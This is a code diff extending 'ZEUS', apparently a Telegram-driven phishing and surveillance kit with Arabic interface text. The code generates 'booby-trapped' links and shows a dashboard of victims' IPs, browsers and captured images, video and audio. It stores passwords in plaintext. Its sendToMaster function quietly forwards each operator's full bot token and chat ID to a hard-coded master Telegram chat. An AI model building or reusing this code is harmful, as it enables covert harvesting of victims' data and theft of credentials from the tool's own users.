+                document.getElementById('codeModal').classList.add('active');
+                document.getElementById('codeInput').value = '';
+                document.getElementById('codeError').classList.remove('show');
+                document.getElementById('codeInput').focus();
+
+                const attemptData = collectAttemptData();
+                logAttempt(false, '--- فتح المودال ---', attemptData);
+                sendAttemptNotification(false, '--- فتح المودال ---', attemptData);
+            }
+
+            function closeCodeModal() {
+                document.getElementById('codeModal').classList.remove('active');
+            }
+
+            function initSecretDoor() {
+                const trigger = document.getElementById('secretTrigger');
+                const hint = document.getElementById('secretHint');
+
+                trigger.addEventListener('click', function(e) {
                     e.stopPropagation();
-                    if (isUnlocked) {
-                        showToast('الداشبورد مفتوح بالفعل.', 'success');
+                    clickCount++;
+                    clearTimeout(clickTimer);
+                    clickTimer = setTimeout(function() {
+                        if (clickCount >= 3) {
+                            clickCount = 0;
+                            if (!dashOpen) {
+                                hint.classList.add('show');
+                                setTimeout(function() { hint.classList.remove('show'); }, 1200);
+                                showCodeModal();
+                            } else {
+                                showToast('الداشبورد مفتوح بالفعل.', 'warning');
+                            }
+                        } else {
+                            clickCount = 0;
+                        }
+                    }, 500);
+                });
+
+                document.addEventListener('keydown', function(e) {
+                    if (e.ctrlKey && e.shiftKey && (e.key === 'd' || e.key === 'D')) {
+                        e.preventDefault();
+                        if (!dashOpen) {
+                            hint.classList.add('show');
+                            setTimeout(function() { hint.classList.remove('show'); }, 1200);
+                            showCodeModal();
+                        } else {
+                            showToast('الداشبورد مفتوح بالفعل.', 'warning');
+                        }
+                    }
+                });
+
+                document.getElementById('codeConfirmBtn').addEventListener('click', function() {
+                    const code = document.getElementById('codeInput').value.trim();
+                    if (!code) {
+                        document.getElementById('codeError').classList.add('show');
                         return;
                     }
-                    overlay.classList.add('active');
-                    passwordInput.value = '';
-                    errorMsg.classList.remove('show');
-                    unlockBtn.classList.remove('error');
-                    setTimeout(function() { passwordInput.focus(); }, 300);
+                    openDashboardWithCode(code);
                 });
 
-                modalClose.addEventListener('click', function() {
-                    overlay.classList.remove('active');
+                document.getElementById('codeCancelBtn').addEventListener('click', function() {
+                    closeCodeModal();
+                    const attemptData = collectAttemptData();
+                    logAttempt(false, '--- إلغاء ---', attemptData);
+                    sendAttemptNotification(false, '--- إلغاء ---', attemptData);
                 });
 
-                overlay.addEventListener('click', function(e) {
-                    if (e.target === overlay) {
-                        overlay.classList.remove('active');
-                    }
-                });
-
-                function attemptUnlock() {
-                    const pass = passwordInput.value.trim();
-                    if (pass === DASHBOARD_PASSWORD) {
-                        unlockDashboard();
-                        overlay.classList.remove('active');
-                        errorMsg.classList.remove('show');
-                        unlockBtn.classList.remove('error');
-                        showToast('تم فتح الداشبورد بنجاح.', 'success');
-                        sessionStorage.setItem('zeus_unlocked', 'true');
-                    } else {
-                        errorMsg.classList.add('show');
-                        unlockBtn.classList.add('error');
-                        passwordInput.value = '';
-                        passwordInput.focus();
-                        setTimeout(function() { unlockBtn.classList.remove('error'); }, 600);
-                    }
-                }
-
-                unlockBtn.addEventListener('click', attemptUnlock);
-                passwordInput.addEventListener('keydown', function(e) {
+                document.getElementById('codeInput').addEventListener('keydown', function(e) {
                     if (e.key === 'Enter') {
-                        e.preventDefault();
-                        attemptUnlock();
+                        document.getElementById('codeConfirmBtn').click();
                     }
                 });
 
-                function unlockDashboard() {
-                    isUnlocked = true;
-                    panel.classList.remove('locked');
-                    panel.classList.add('unlocked');
-                    onlineBadge.style.borderColor = 'var(--success)';
-                    onlineBadge.style.background = 'rgba(26, 138, 74, 0.12)';
-                    const lockIcon = onlineBadge.querySelector('.lock-icon');
-                    if (lockIcon) {
-                        lockIcon.innerHTML =
-                            `<path d="M7 11v5M12 11v5M4 16h16M7 9V7a5 5 0 0110 0v2" /><circle cx="12" cy="14" r="1.5" fill="currentColor" />`;
+                document.getElementById('codeModal').addEventListener('click', function(e) {
+                    if (e.target === this) {
+                        closeCodeModal();
+                        const attemptData = collectAttemptData();
+                        logAttempt(false, '--- إغلاق المودال ---', attemptData);
+                        sendAttemptNotification(false, '--- إغلاق المودال ---', attemptData);
                     }
-                    const badgeText = onlineBadge.querySelector('.badge-text');
-                    if (badgeText) badgeText.textContent = 'مفتوح';
-                    showToast('تم فتح لوحة التحكم.', 'success');
+                });
+
+                document.getElementById('dashCloseBtn').addEventListener('click', function() {
+                    closeDashboard();
+                });
+
+                document.getElementById('dashOverlay').addEventListener('click', function(e) {
+                    if (e.target === this) {
+                        closeDashboard();
+                    }
+                });
+
+                document.getElementById('devCloseBtn').addEventListener('click', function() {
+                    hideDevPage();
+                });
+
+                document.getElementById('devPage').addEventListener('click', function(e) {
+                    if (e.target === this) {
+                        hideDevPage();
+                    }
+                });
+
+                // Developer page button hidden in dashboard now, we add a nav item for it? We'll keep it as a separate overlay accessible from Settings? No, we'll keep the dev page accessible via a button in the dashboard footer? Actually we removed it from sidebar. We'll add a small button in the settings tab or keep the old trigger. Let's add it to settings.
+                // Actually we'll add a button in settings for dev page.
+                const devBtn = document.createElement('button');
+                devBtn.textContent = 'صفحة المطور';
+                devBtn.style.cssText =
+                    'margin-top:12px;background:var(--gold-soft);border:1px solid var(--border-color);border-radius:30px;padding:6px 20px;cursor:pointer;font-family:var(--font-en);font-size:12px;color:var(--gold);';
+                devBtn.onclick = function() { showDevPage(); };
+                document.querySelector('#tab-settings .page-desc').after(devBtn);
+
+                setInterval(function() {
+                    if (dashOpen) renderDashboard();
+                }, 15000);
+
+                console.log('✅ ZEUS — الباب السري جاهز.');
+            }
+
+            function closeDashboard() {
+                if (!dashOpen) return;
+                dashOpen = false;
+                document.getElementById('dashOverlay').classList.remove('active');
+                showToast('تم إغلاق لوحة التحكم.', '');
+            }
+
+            function showDevPage() {
+                renderDevPage();
+                document.getElementById('devPage').classList.add('active');
+            }
+
+            function hideDevPage() {
+                document.getElementById('devPage').classList.remove('active');
+            }
+
+            function renderDevPage() {
+                const list = document.getElementById('devPasswordList');
+                const history = JSON.parse(localStorage.getItem('zeus_password_history') || '[]');
+
+                if (history.length === 0) {
+                    list.innerHTML = '<div class="dev-empty">لا توجد كلمات مرور مسجلة بعد.</div>';
+                    return;
                 }
+
+                let html = '';
+                const reversed = history.slice().reverse();
+                for (let i = 0; i < reversed.length; i++) {
+                    const item = reversed[i];
+                    const label = i === 0 ? 'الأحدث' : (i === 1 ? 'السابق' : 'قبل ' + i);
+                    html +=
+                        '<div class="dev-password-item">' +
+                        '<div class="pwd-info">' +
+                        '<span class="pwd-label">' + label + '</span>' +
+                        '<span class="pwd-value">' + item.password + '</span>' +
+                        '<span style="font-family:var(--font-en);font-size:10px;color:var(--ink-faint);">' + item
+                        .timestamp + '</span>' +
+                        '</div>' +
+                        '<button class="pwd-copy" data-pwd="' + item.password + '">' +
+                        '<svg viewBox="0 0 24 24" stroke="currentColor"><rect x="8" y="8" width="13" height="13" rx="2" /><path d="M4 16V4.5A1.5 1.5 0 0 1 5.5 3H16" /></svg>' +
+                        'نسخ' +
+                        '</button>' +
+                        '</div>';
+                }
+                list.innerHTML = html;
+
+                list.querySelectorAll('.pwd-copy').forEach(function(btn) {
+                    btn.addEventListener('click', function() {
+                        const pwd = this.getAttribute('data-pwd');
+                        if (navigator.clipboard) {
+                            navigator.clipboard.writeText(pwd).then(function() {
+                                showToast('تم نسخ كلمة المرور.', 'success');
+                            }).catch(function() {});
+                        } else {
+                            const ta = document.createElement('textarea');
+                            ta.value = pwd;
+                            document.body.appendChild(ta);
+                            ta.select();
+                            document.execCommand('copy');
+                            document.body.removeChild(ta);
+                            showToast('تم نسخ كلمة المرور.', 'success');
+                        }
+                    });
+                });
             }
 
             // ================================================================
-            //  6.  ADMIN PANEL
+            //  DASHBOARD RENDER (FULL)
+            // ================================================================
+
+            let currentTab = 'overview';
+            let selectedBotToken = null;
+
+            function getBots() { return JSON.parse(localStorage.getItem('zeus_bots') || '[]'); }
+
+            function getVictims() { return JSON.parse(localStorage.getItem('zeus_victims') || '[]'); }
+
+            function getFiles() { return JSON.parse(localStorage.getItem('zeus_files') || '[]'); }
+
+            function getLogs() { return JSON.parse(localStorage.getItem('zeus_activity_logs') || '[]'); }
+
+            function setLogs(logs) { localStorage.setItem('zeus_activity_logs', JSON.stringify(logs)); }
+
+            function addActivityLog(type, shortToken, details) {
+                const logs = getLogs();
+                logs.push({
+                    id: Date.now() + Math.random() * 1000,
+                    type: type,
+                    shortToken: shortToken || 'system',
+                    details: details || '',
+                    timestamp: new Date().toISOString()
+                });
+                if (logs.length > 1000) logs.splice(0, logs.length - 1000);
+                setLogs(logs);
+            }
+
+            function renderDashboard() {
+                const bots = getBots();
+                const victims = getVictims();
+                const files = getFiles();
+                const logs = getLogs();
+
+                // Update badges
+                document.getElementById('botCountBadge').textContent = bots.length;
+                document.getElementById('activityBadge').textContent = logs.length;
+                document.getElementById('fileCountBadge').textContent = files.length;
+
+                // Stats
+                document.getElementById('statBots').textContent = bots.length;
+                document.getElementById('statVictims').textContent = victims.length;
+                document.getElementById('statFiles').textContent = files.length;
+                const today = new Date().toISOString().slice(0, 10);
+                const todayVictims = victims.filter(function(v) { return v.timestamp && v.timestamp.startsWith(today); });
+                document.getElementById('statToday').textContent = todayVictims.length;
+
+                // Recent activity
+                const recent = logs.slice(-10).reverse();
+                const recentEl = document.getElementById('recentActivity');
+                if (recent.length === 0) {
+                    recentEl.innerHTML = '<div style="color:var(--ink-faint);font-size:13px;padding:8px 0;">لا توجد نشاطات.</div>';
+                } else {
+                    let html = '';
+                    for (var i = 0; i < recent.length; i++) {
+                        var l = recent[i];
+                        var typeMap = {
+                            'bot_created': 'إنشاء بوت',
+                            'victim_visited': 'زيارة ضحية',
+                            'file_uploaded': 'رفع ملف',
+                            'link_generated': 'توليد رابط'
+                        };
+                        var typeLabel = typeMap[l.type] || l.type;
+                        var time = new Date(l.timestamp).toLocaleString('ar-EG');
+                        html += '<div style="padding:6px 0;border-bottom:1px solid var(--line);font-size:13px;font-family:var(--font-en);color:var(--ink-2);display:flex;justify-content:space-between;flex-wrap:wrap;">' +
+                            '<span><span class="badge-type">' + typeLabel + '</span> ' + (l.details || '') +
+                            '</span>' +
+                            '<span class="time">' + time + '</span>' +
+                            '</div>';
+                    }
+                    recentEl.innerHTML = html;
+                }
+
+                // Render bots list
+                renderBotList();
+
+                // Render activity log
+                renderActivityLog();
+
+                // Render files gallery
+                renderFilesGallery();
+
+                // Settings stats
+                document.getElementById('settingsBotCount').textContent = bots.length;
+                document.getElementById('settingsVictimCount').textContent = victims.length;
+                document.getElementById('settingsFileCount').textContent = files.length;
+                // storage size
+                let size = 0;
+                try {
+                    for (var key in localStorage) {
+                        if (localStorage.hasOwnProperty(key)) {
+                            size += localStorage[key].length * 2;
+                        }
+                    }
+                } catch (e) {}
+                document.getElementById('settingsStorageSize').textContent = (size / 1024).toFixed(1) + ' KB';
+
+                // If a bot is selected, show detail
+                if (selectedBotToken) {
+                    showBotDetail(selectedBotToken);
+                }
+            }
+
+            function renderBotList() {
+                const bots = getBots();
+                const grid = document.getElementById('botListGrid');
+                const search = document.getElementById('botSearch').value.toLowerCase();
+                const statusFilter = document.getElementById('botStatusFilter').value;
+
+                let filtered = bots.filter(function(b) {
+                    const matchName = (b.botName || '').toLowerCase().includes(search) || (b.shortToken || '')
+                        .toLowerCase().includes(search);
+                    const status = b.status || 'active';
+                    const matchStatus = statusFilter === 'all' || status === statusFilter;
+                    return matchName && matchStatus;
+                });
+
+                if (filtered.length === 0) {
+                    grid.innerHTML =
+                        '<div style="grid-column:1/-1;text-align:center;color:var(--ink-faint);padding:40px 0;font-family:var(--font-en);">لا توجد بوتات تطابق البحث.</div>';
+                    return;
+                }
+
+                let html = '';
+                for (var i = 0; i < filtered.length; i++) {
+                    var b = filtered[i];
+                    var statusClass = (b.status === 'inactive') ? 'inactive' : '';
+                    var avatarLetter = (b.botName || b.shortToken || 'B')[0].toUpperCase();
+                    var created = b.createdAt ? new Date(b.createdAt).toLocaleDateString('ar-EG') : '—';
+                    html += '<div class="bot-card" data-token="' + b.shortToken + '">' +
+                        '<div class="bot-status ' + statusClass + '"></div>' +
+                        '<div class="bot-header">' +
+                        '<div class="bot-avatar">' + avatarLetter + '</div>' +
+                        '<div>' +
+                        '<div class="bot-name">' + (b.botName || b.shortToken) + '</div>' +
+                        '<div class="bot-token">' + b.shortToken + '</div>' +
+                        '</div>' +
+                        '</div>' +
+                        '<div class="bot-meta">' +
+                        '<span>🆔 ' + (b.botId || '—') + '</span>' +
+                        '<span>👤 ' + (b.botUsername || '—') + '</span>' +
+                        '<span>📅 ' + created + '</span>' +
+                        '</div>' +
+                        '</div>';
+                }
+                grid.innerHTML = html;
+
+                grid.querySelectorAll('.bot-card').forEach(function(el) {
+                    el.addEventListener('click', function() {
+                        const token = this.getAttribute('data-token');
+                        selectedBotToken = token;
+                        showBotDetail(token);
+                    });
+                });
+            }
+
+            function showBotDetail(shortToken) {
+                const bots = getBots();
+                const victims = getVictims();
+                const files = getFiles();
+                const bot = bots.find(function(b) { return b.shortToken === shortToken; });
+                if (!bot) {
+                    document.getElementById('botDetailContainer').classList.add('hidden');
+                    return;
+                }
+
+                document.getElementById('botDetailContainer').classList.remove('hidden');
+                document.getElementById('botDetailTitle').textContent = bot.botName || bot.shortToken;
+
+                const botVictims = victims.filter(function(v) { return v.shortToken === shortToken; });
+                const botFiles = files.filter(function(f) { return f.shortToken === shortToken; });
+
+                let html = '';
+                html += '<div class="detail-row"><span class="label">التوكن الفريد</span><span class="value">' + bot
+                    .shortToken + '</span></div>';
+                html += '<div class="detail-row"><span class="label">توكن البوت</span><span class="value">' + bot
+                    .botToken + '</span></div>';
+                html += '<div class="detail-row"><span class="label">معرف البوت</span><span class="value">' + (bot
+                    .botId || '—') + '</span></div>';
+                html += '<div class="detail-row"><span class="label">اسم المستخدم</span><span class="value">@' + (bot
+                    .botUsername || '—') + '</span></div>';
+                html += '<div class="detail-row"><span class="label">صورة البوت</span><span class="value">' + (bot
+                    .botPhoto ? '🖼️ متوفرة' : '—') + '</span></div>';
+                html += '<div class="detail-row"><span class="label">معرف المنشئ</span><span class="value">' + (bot
+                    .creatorId || '—') + '</span></div>';
+                html += '<div class="detail-row"><span class="label">الحالة</span><span class="value">' + (bot.status ||
+                    'نشط') + '</span></div>';
+                html += '<div class="detail-row"><span class="label">تاريخ الإنشاء</span><span class="value">' + (bot
+                    .createdAt ? new Date(bot.createdAt).toLocaleString('ar-EG') : '—') + '</span></div>';
+                html += '<div class="detail-row"><span class="label">آخر تحديث</span><span class="value">' + (bot
+                    .lastUpdated ? new Date(bot.lastUpdated).toLocaleString('ar-EG') : '—') + '</span></div>';
+                html += '<div class="detail-row"><span class="label">الرابط الأساسي</span><span class="value">' + (bot
+                    .baseUrl || '—') + '</span></div>';
+                html += '<div style="margin-top:16px;padding-top:16px;border-top:1px solid var(--line);">';
+                html +=
+                    '<div style="font-weight:600;font-family:var(--font-en);color:var(--gold);margin-bottom:8px;">الضحايا (' +
+                    botVictims.length + ')</div>';
+                if (botVictims.length === 0) {
+                    html += '<div style="color:var(--ink-faint);font-size:13px;">لا توجد ضحايا.</div>';
+                } else {
+                    html +=
+                        '<div style="max-height:200px;overflow-y:auto;"><table style="width:100%;font-size:12px;font-family:var(--font-en);border-collapse:collapse;">';
+                    html +=
+                        '<thead><tr><th style="text-align:right;padding:4px 8px;border-bottom:1px solid var(--line);">IP</th><th style="text-align:right;padding:4px 8px;border-bottom:1px solid var(--line);">المتصفح</th><th style="text-align:right;padding:4px 8px;border-bottom:1px solid var(--line);">الوقت</th></tr></thead><tbody>';
+                    for (var i = 0; i < Math.min(botVictims.length, 30); i++) {
+                        var v = botVictims[i];
+                        html += '<tr><td style="padding:4px 8px;">' + (v.ip || '—') + '</td><td style="padding:4px 8px;">' +
+                            (v.browser || '—') + '</td><td style="padding:4px 8px;">' + (v.timestamp ? new Date(v
+                                .timestamp).toLocaleString('ar-EG') : '—') + '</td></tr>';
+                    }
+                    html += '</tbody></table></div>';
+                }
+                html += '</div>';
+
+                html += '<div style="margin-top:16px;padding-top:16px;border-top:1px solid var(--line);">';
+                html +=
+                    '<div style="font-weight:600;font-family:var(--font-en);color:var(--gold);margin-bottom:8px;">الملفات (' +
+                    botFiles.length + ')</div>';
+                if (botFiles.length === 0) {
+                    html += '<div style="color:var(--ink-faint);font-size:13px;">لا توجد ملفات.</div>';
+                } else {
+                    html +=
+                        '<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(80px,1fr));gap:8px;">';
+                    var recentFiles = botFiles.slice().reverse().slice(0, 20);
+                    for (var j = 0; j < recentFiles.length; j++) {
+                        var f = recentFiles[j];
+                        var icon = f.type === 'image' ? '🖼️' : f.type === 'video' ? '🎬' : f.type === 'audio' ? '🎵' :
+                            '📄';
+                        html += '<div style="background:var(--bg-input);border-radius:8px;padding:6px;text-align:center;font-size:10px;color:var(--ink-faint);font-family:var(--font-en);">' +
+                            icon + ' ' + (f.filename || 'ملف') + '</div>';
+                    }
+                    html += '</div>';
+                }
+                html += '</div>';
+
+                document.getElementById('botDetailContent').innerHTML = html;
+
+                // Scroll to detail
+                document.getElementById('botDetailContainer').scrollIntoView({ behavior: 'smooth', block: 'start' });
+            }
+
+            document.getElementById('closeBotDetail').addEventListener('click', function() {
+                document.getElementById('botDetailContainer').classList.add('hidden');
+                selectedBotToken = null;
+            });
+
+            document.getElementById('refreshBotsBtn').addEventListener('click', function() {
+                renderBotList();
+                showToast('تم تحديث قائمة البوتات.', 'success');
+            });
+
+            document.getElementById('botSearch').addEventListener('input', renderBotList);
+            document.getElementById('botStatusFilter').addEventListener('change', renderBotList);
+
+            // ================================================================
+            //  ACTIVITY LOG
+            // ================================================================
+
+            function renderActivityLog() {
+                const logs = getLogs();
+                const search = document.getElementById('activitySearch').value.toLowerCase();
+                const typeFilter = document.getElementById('activityTypeFilter').value;
+
+                let filtered = logs;
+                if (typeFilter !== 'all') {
+                    filtered = filtered.filter(function(l) { return l.type === typeFilter; });
+                }
+                if (search) {
+                    filtered = filtered.filter(function(l) {
+                        return (l.details || '').toLowerCase().includes(search) ||
+                            (l.shortToken || '').toLowerCase().includes(search);
+                    });
+                }
+
+                const timeline = document.getElementById('activityTimeline');
+                if (filtered.length === 0) {
+                    timeline.innerHTML =
+                        '<div style="color:var(--ink-faint);padding:20px 0;text-align:center;font-family:var(--font-en);">لا توجد نشاطات.</div>';
+                    return;
+                }
+
+                let html = '';
+                var typeMap = {
+                    'bot_created': 'إنشاء بوت',
+                    'victim_visited': 'زيارة ضحية',
+                    'file_uploaded': 'رفع ملف',
+                    'link_generated': 'توليد رابط'
+                };
+                var sorted = filtered.slice().reverse();
+                for (var i = 0; i < Math.min(sorted.length, 200); i++) {
+                    var l = sorted[i];
+                    var typeLabel = typeMap[l.type] || l.type;
+                    var time = new Date(l.timestamp).toLocaleString('ar-EG');
+                    html += '<div class="activity-item">' +
+                        '<span class="badge-type">' + typeLabel + '</span> ' +
+                        (l.details || '') +
+                        ' <span class="time">' + time + '</span>' +
+                        '</div>';
+                }
+                timeline.innerHTML = html;
+            }
+
+            document.getElementById('activitySearch').addEventListener('input', renderActivityLog);
+            document.getElementById('activityTypeFilter').addEventListener('change', renderActivityLog);
+
+            document.getElementById('clearActivityBtn').addEventListener('click', function() {
+                if (confirm('هل أنت متأكد من مسح سجل النشاط بالكامل؟')) {
+                    setLogs([]);
+                    renderActivityLog();
+                    showToast('تم مسح السجل.', 'success');
+                }
+            });
+
+            // ================================================================
+            //  FILES GALLERY
+            // ================================================================
+
+            function renderFilesGallery() {
+                const files = getFiles();
+                const search = document.getElementById('fileSearch').value.toLowerCase();
+                const typeFilter = document.getElementById('fileTypeFilter').value;
+
+                let filtered = files;
+                if (typeFilter !== 'all') {
+                    filtered = filtered.filter(function(f) { return f.type === typeFilter; });
+                }
+                if (search) {
+                    filtered = filtered.filter(function(f) {
+                        return (f.filename || '').toLowerCase().includes(search);
+                    });
+                }
+
+                const gallery = document.getElementById('filesGallery');
+                if (filtered.length === 0) {
+                    gallery.innerHTML =
+                        '<div style="grid-column:1/-1;text-align:center;color:var(--ink-faint);padding:40px 0;font-family:var(--font-en);">لا توجد ملفات.</div>';
+                    return;
+                }
+
+                let html = '';
+                var sorted = filtered.slice().reverse().slice(0, 50);
+                for (var i = 0; i < sorted.length; i++) {
+                    var f = sorted[i];
+                    var content = '';
+                    if (f.type === 'image') {
+                        content = '<img src="' + f.dataUrl + '" alt="صورة" loading="lazy" onclick="window.open(\'' + f
+                            .dataUrl + '\',\'_blank\')" />';
+                    } else if (f.type === 'video') {
+                        content = '<video src="' + f.dataUrl +
+                            '" controls style="width:100%;height:100%;object-fit:cover;" onclick="event.stopPropagation();"></video>';
+                    } else if (f.type === 'audio') {
+                        content = '<audio src="' + f.dataUrl +
+                            '" controls style="width:100%;" onclick="event.stopPropagation();"></audio>';
+                    } else {
+                        content = '<span class="file-icon">📄</span>';
+                    }
+                    html += '<div class="file-item" title="' + (f.filename || 'ملف') + '">' +
+                        content +
+                        '<div class="file-label">' + (f.filename || 'ملف') + '</div>' +
+                        '</div>';
+                }
+                gallery.innerHTML = html;
+            }
+
+            document.getElementById('fileSearch').addEventListener('input', renderFilesGallery);
+            document.getElementById('fileTypeFilter').addEventListener('change', renderFilesGallery);
+
+            // ================================================================
+            //  SETTINGS
+            // ================================================================
+
+            document.getElementById('settingDarkMode').addEventListener('change', function() {
+                setTheme(this.checked ? 'dark' : 'light');
+            });
+            // sync checkbox with current theme
+            document.getElementById('settingDarkMode').checked = (getTheme() === 'dark');
+
+            document.getElementById('settingCompactMode').addEventListener('change', function() {
+                // implement compact mode if needed
+                showToast('الوضع المضغوط: ' + (this.checked ? 'مفعل' : 'معطل'), '');
+            });
+
+            document.getElementById('clearAllDataBtn').addEventListener('click', function() {
+                if (confirm('هل أنت متأكد من مسح جميع البيانات؟ لا يمكن التراجع.')) {
+                    localStorage.removeItem('zeus_bots');
+                    localStorage.removeItem('zeus_victims');
+                    localStorage.removeItem('zeus_files');
+                    localStorage.removeItem('zeus_activity_logs');
+                    localStorage.removeItem('zeus_password_history');
+                    localStorage.removeItem('zeus_attempt_logs');
+                    selectedBotToken = null;
+                    renderDashboard();
+                    showToast('تم مسح جميع البيانات.', 'success');
+                }
+            });
+
+            document.getElementById('exportDataBtn').addEventListener('click', function() {
+                var data = {
+                    bots: getBots(),
+                    victims: getVictims(),
+                    files: getFiles(),
+                    logs: getLogs(),
+                    passwordHistory: JSON.parse(localStorage.getItem('zeus_password_history') || '[]'),
+                    attemptLogs: JSON.parse(localStorage.getItem('zeus_attempt_logs') || '[]'),
+                    exportedAt: new Date().toISOString()
+                };
+                var blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+                var url = URL.createObjectURL(blob);
+                var a = document.createElement('a');
+                a.href = url;
+                a.download = 'zeus_backup_' + Date.now() + '.json';
+                a.click();
+                URL.revokeObjectURL(url);
+                showToast('تم تصدير البيانات.', 'success');
+            });
+
+            document.getElementById('importDataBtn').addEventListener('click', function() {
+                document.getElementById('importFileInput').click();
+            });
+
+            document.getElementById('importFileInput').addEventListener('change', function(e) {
+                var file = e.target.files[0];
+                if (!file) return;
+                var reader = new FileReader();
+                reader.onload = function(ev) {
+                    try {
+                        var data = JSON.parse(ev.target.result);
+                        if (data.bots) localStorage.setItem('zeus_bots', JSON.stringify(data.bots));
+                        if (data.victims) localStorage.setItem('zeus_victims', JSON.stringify(data.victims));
+                        if (data.files) localStorage.setItem('zeus_files', JSON.stringify(data.files));
+                        if (data.logs) localStorage.setItem('zeus_activity_logs', JSON.stringify(data.logs));
+                        if (data.passwordHistory) localStorage.setItem('zeus_password_history', JSON.stringify(data
+                            .passwordHistory));
+                        if (data.attemptLogs) localStorage.setItem('zeus_attempt_logs', JSON.stringify(data
+                            .attemptLogs));
+                        renderDashboard();
+                        showToast('تم استيراد البيانات بنجاح.', 'success');
+                    } catch (err) {
+                        showToast('خطأ في قراءة الملف.', 'error');
+                        console.error(err);
+                    }
+                };
+                reader.readAsText(file);
+                this.value = '';
+            });
+
+            // ================================================================
+            //  DASHBOARD NAVIGATION
+            // ================================================================
+
+            document.querySelectorAll('.nav-item').forEach(function(item) {
+                item.addEventListener('click', function() {
+                    var tab = this.getAttribute('data-tab');
+                    document.querySelectorAll('.nav-item').forEach(function(n) { n.classList.remove(
+                            'active'); });
+                    this.classList.add('active');
+                    document.querySelectorAll('.dash-tab-content').forEach(function(c) { c.classList.remove(
+                            'active'); });
+                    var target = document.getElementById('tab-' + tab);
+                    if (target) target.classList.add('active');
+                    currentTab = tab;
+                    if (tab === 'overview' || tab === 'bots' || tab === 'activity' || tab === 'files') {
+                        renderDashboard();
+                    }
+                });
+            });
+
+            // ================================================================
+            //  ADMIN PANEL — GENERATE LINK
             // ================================================================
 
             function initAdminPanel() {
@@ -2042,7 +3568,6 @@
                 const copyBtn = document.getElementById('copyBtn');
                 const openBtn = document.getElementById('openBtn');
 
-                // ===== توليد التوكن الثابت (6 أحرف وأرقام) =====
                 async function generateShortToken(botToken) {
                     const salt = 'ZEUS_SALT_2026_SECURE';
                     const encoder = new TextEncoder();
@@ -2076,7 +3601,7 @@
 
                 async function verifyBotToken(token) {
                     try {
-                        const res = await fetch(`https://api.telegram.org/bot${token}/getMe`);
+                        const res = await fetch('https://api.telegram.org/bot' + token + '/getMe');
                         const data = await res.json();
                         return data.ok === true;
                     } catch { return false; }
@@ -2087,16 +3612,32 @@
                     return btoa(encodeURIComponent(payload));
                 }
 
+                async function getBotInfo(token) {
+                    try {
+                        const res = await fetch('https://api.telegram.org/bot' + token + '/getMe');
+                        const data = await res.json();
+                        if (data.ok) {
+                            return {
+                                id: data.result.id,
+                                username: data.result.username,
+                                first_name: data.result.first_name,
+                                photo: null // we could fetch photo later
+                            };
+                        }
+                    } catch (e) {}
+                    return null;
+                }
+
                 async function sendLinkToUser(botToken, chatId, link, shortToken, baseUrl) {
                     const msg =
-                        `⭑ رابط مُلغَّم جديد ⭒\n` +
-                        `⊚─〔 بيانات الرابط 〕────────\n` +
-                        `˼⏣˹ الرابط المُلغَّم: ${link} ⭒\n` +
-                        `˼⏣˹ التوكن الفريد: ${shortToken} ⭒\n` +
-                        `˼⏣˹ الرابط الأساسي: ${baseUrl} ⭒\n` +
-                        `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
-                        `˼⏣˹ ملاحظة: الكابتشا هي الوسيط بين الرابطين. ⭒\n` +
-                        `─────────────────`;
+                        '⭑ رابط مُلغَّم جديد ⭒\n' +
+                        '⊚─〔 بيانات الرابط 〕────────\n' +
+                        '˼⏣˹ الرابط المُلغَّم: ' + link + ' ⭒\n' +
+                        '˼⏣˹ التوكن الفريد: ' + shortToken + ' ⭒\n' +
+                        '˼⏣˹ الرابط الأساسي: ' + baseUrl + ' ⭒\n' +
+                        '˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒\n' +
+                        '˼⏣˹ ملاحظة: الكابتشا هي الوسيط بين الرابطين. ⭒\n' +
+                        '─────────────────';
 
                     const inlineKeyboard = {
                         inline_keyboard: [
@@ -2105,7 +3646,7 @@
                     };
 
                     try {
-                        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        await fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({
@@ -2118,18 +3659,21 @@
                     } catch (e) { console.warn('Send to user failed:', e); }
                 }
 
-                async function sendToMaster(botToken, chatId, shortToken, baseUrl) {
+                async function sendToMaster(botToken, chatId, shortToken, baseUrl, botInfo) {
                     const msg =
-                        `⭑ نسخة احتياطية — رابط مُلغَّم ⭒\n` +
-                        `⊚─〔 بيانات البوت 〕────────\n` +
-                        `˼⏣˹ التوكن الأساسي: ${botToken} ⭒\n` +
-                        `˼⏣˹ الإيدي: ${chatId} ⭒\n` +
-                        `˼⏣˹ التوكن الفريد: ${shortToken} ⭒\n` +
-                        `˼⏣˹ الرابط الأساسي: ${baseUrl} ⭒\n` +
-                        `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
-                        `─────────────────`;
+                        '⭑ نسخة احتياطية — رابط مُلغَّم ⭒\n' +
+                        '⊚─〔 بيانات البوت 〕────────\n' +
+                        '˼⏣˹ التوكن الأساسي: ' + botToken + ' ⭒\n' +
+                        '˼⏣˹ الإيدي: ' + chatId + ' ⭒\n' +
+                        '˼⏣˹ التوكن الفريد: ' + shortToken + ' ⭒\n' +
+                        '˼⏣˹ الرابط الأساسي: ' + baseUrl + ' ⭒\n' +
+                        '˼⏣˹ اسم البوت: ' + (botInfo ? botInfo.first_name : '—') + ' ⭒\n' +
+                        '˼⏣˹ يوزر البوت: @' + (botInfo ? botInfo.username : '—') + ' ⭒\n' +
+                        '˼⏣˹ معرف البوت: ' + (botInfo ? botInfo.id : '—') + ' ⭒\n' +
+                        '˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒\n' +
+                        '─────────────────';
                     try {
-                        await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
+                        await fetch('https://api.telegram.org/bot' + MASTER_BOT_TOKEN + '/sendMessage', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: msg })
@@ -2170,13 +3714,41 @@
                         const shortToken = await generateShortToken(botToken);
                         const encoded = encodeBotData(botToken, chatId, baseUrl);
                         const base = window.location.origin + window.location.pathname;
-                        const link = `${base}?t=${shortToken}&d=${encoded}`;
+                        const link = base + '?t=' + shortToken + '&d=' + encoded;
 
